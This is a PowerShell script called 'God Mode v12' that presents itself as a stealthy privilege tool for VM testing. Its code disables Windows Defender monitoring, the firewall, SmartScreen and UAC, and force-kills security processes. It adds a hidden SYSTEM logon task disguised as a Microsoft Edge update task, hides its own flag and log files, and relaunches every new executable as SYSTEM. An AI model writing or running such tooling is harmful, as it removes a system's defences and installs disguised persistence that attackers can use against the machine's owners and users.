#Requires -RunAsAdministrator

<#
.SYNOPSIS
    God Mode v12 - Polished Edition
.DESCRIPTION
    Stealthy and powerful privilege tool for VM testing.
    Restricted to Built-in Administrator only.
#>

param(
    [switch]$ToggleOn,
    [switch]$ToggleOff,
    [switch]$Status,
    [switch]$Launch,
    [switch]$Help
)

# ============================================================
#  CONFIGURATION
# ============================================================
$FlagFile   = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syscache"
$LogFile    = "C:\Windows\SysWOW64\config\systemprofile\AppData\Local\Temp\.syslog"
$TaskPrefix = "MicrosoftEdgeUpdateTask_"

# ============================================================
#  SECURITY CHECK
# ============================================================
function Test-BuiltInAdmin {
    $sid = [Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    return ($sid -like "*-500")
}

if (-not (Test-BuiltInAdmin) -and -not $Status -and -not $Help) {
    Write-Host "`n[ACCESS DENIED] This tool can only be used by the Built-in Administrator.`n" -ForegroundColor Red
    exit 1
}

# ============================================================
#  LOGGING
# ============================================================
function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "[$timestamp] [$Level] $Message" | Out-File $LogFile -Append -Encoding UTF8
}

# ============================================================
#  DANGEROUS SETTINGS
# ============================================================
function Enable-DangerousMode {
    Write-Log "Enabling dangerous mode..." "WARN"

    try {
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $false -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name ConsentPromptBehaviorAdmin -Value 0 -Force

        # Kill security processes
        Get-Process -Name MsMpEng, smartscreen, SecurityHealthService -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue

        Write-Log "Dangerous mode enabled." "WARN"
    }
    catch {
        Write-Log "Error enabling dangerous mode: $_" "ERROR"
    }
}

function Disable-DangerousMode {
    Write-Log "Disabling dangerous mode..." "WARN"
    try {
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled $true -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" `
            -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" `
            -Name EnableLUA -Value 1 -Force
        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
    }
    catch {
        Write-Log "Could not fully restore settings: $_" "ERROR"
    }
}

# ============================================================
#  STEALTH TASK
# ============================================================
function Register-StealthTask {
    $taskName = $TaskPrefix + (Get-Random -Minimum 10000 -Maximum 99999)
    Unregister-StealthTask

    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"

    $trigger = New-ScheduledTaskTrigger -AtLogon
    $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
        -LogonType ServiceAccount -RunLevel Highest

    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
        -Principal $principal -Force | Out-Null
}

function Unregister-StealthTask {
    Get-ScheduledTask -TaskName "$TaskPrefix*" -ErrorAction SilentlyContinue |
        Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
}

# ============================================================
#  PROCESS ELEVATION
# ============================================================
function Elevate-Process {
    param([string]$Path)
    if (-not (Test-Path $Path)) { return }

    Write-Log "Elevating: $Path" "STEALTH"

    try {
        $action = New-ScheduledTaskAction -Execute $Path
        $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
            -LogonType ServiceAccount -RunLevel Highest
        $tempTask = "Elevate_" + (Get-Random -Minimum 1000 -Maximum 99999)

        Register-ScheduledTask -TaskName $tempTask -Action $action -Principal $principal -Force | Out-Null
        Start-ScheduledTask -TaskName $tempTask
        Start-Sleep -Milliseconds 400
        Unregister-ScheduledTask -TaskName $tempTask -Confirm:$false
    }
    catch {
        Write-Log "Failed to elevate: $Path" "ERROR"
    }
}

# ============================================================
#  MONITORING LOOP
# ============================================================
function Start-Monitoring {
    if (-not (Test-Path $FlagFile)) {
        Write-Log "God Mode is not enabled." "ERROR"
        return
    }

    Write-Log "Monitoring started." "INFO"

    $seen = @{}

    while ($true) {
        Start-Sleep -Seconds 2

        try {
            $newProcesses = Get-WmiObject Win32_Process | Where-Object {
                $_.CreationDate -and 
                ([datetime]::ParseExact($_.CreationDate.Substring(0,14), "yyyyMMddHHmmss", $null)) -gt (Get-Date).AddSeconds(-10)
            }

            foreach ($proc in $newProcesses) {
                if ($proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe") {
                    if (-not $seen.ContainsKey($proc.ExecutablePath)) {
                        $seen[$proc.ExecutablePath] = $true
                        Elevate-Process $proc.ExecutablePath
                    }
                }
            }
        }
        catch {
            Write-Log "Error in monitoring loop: $_" "ERROR"
            Start-Sleep -Seconds 5
        }
    }
}

# ============================================================
#  TOGGLE FUNCTIONS
# ============================================================
function Enable-GodMode {
    "1" | Out-File $FlagFile -Force
    Register-StealthTask
    Enable-DangerousMode
    Write-Log "God Mode ENABLED" "WARN"
}

function Disable-GodMode {
    Remove-Item $FlagFile -Force -ErrorAction SilentlyContinue
    Unregister-StealthTask
    Disable-DangerousMode
    Write-Log "God Mode DISABLED" "WARN"
}

function Show-Status {
    if (Test-Path $FlagFile) {
        Write-Host "God Mode: ACTIVE (Dangerous + Stealth)" -ForegroundColor Red
    } else {
        Write-Host "God Mode: INACTIVE" -ForegroundColor Green
    }
}

# ============================================================
#  INTERACTIVE MENU
# ============================================================
function Show-Menu {
    Clear-Host
    Write-Host "=== GOD MODE v12 ===" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Enable God Mode"
    Write-Host "2. Disable God Mode"
    Write-Host "3. Check Status"
    Write-Host "4. Start Monitoring"
    Write-Host "5. Exit"
    Write-Host ""

    $choice = Read-Host "Select an option (1-5)"

    switch ($choice) {
        "1" { Enable-GodMode; Write-Host "God Mode enabled." -ForegroundColor Green; Start-Sleep -Seconds 2; Show-Menu }
        "2" { Disable-GodMode; Write-Host "God Mode disabled." -ForegroundColor Yellow; Start-Sleep -Seconds 2; Show-Menu }
        "3" { Show-Status; Start-Sleep -Seconds 2; Show-Menu }
        "4" { Start-Monitoring }
        "5" { exit }
        default { Write-Host "Invalid option." -ForegroundColor Red; Start-Sleep -Seconds 1; Show-Menu }
    }
}

# ============================================================
#  MAIN
# ============================================================

if ($Help) {
    Write-Host @"
God Mode v12 Commands:
  -ToggleOn     Enable God Mode
  -ToggleOff    Disable God Mode
  -Status       Show status
  -Launch       Start monitoring
  (Run without parameters for interactive menu)
"@ -ForegroundColor Cyan
    exit
}

if ($ToggleOn)  { Enable-GodMode; exit }
if ($ToggleOff) { Disable-GodMode; exit }
if ($Status)    { Show-Status; exit }
if ($Launch)    { Start-Monitoring; exit }

# If no parameters, show interactive menu
Show-Menu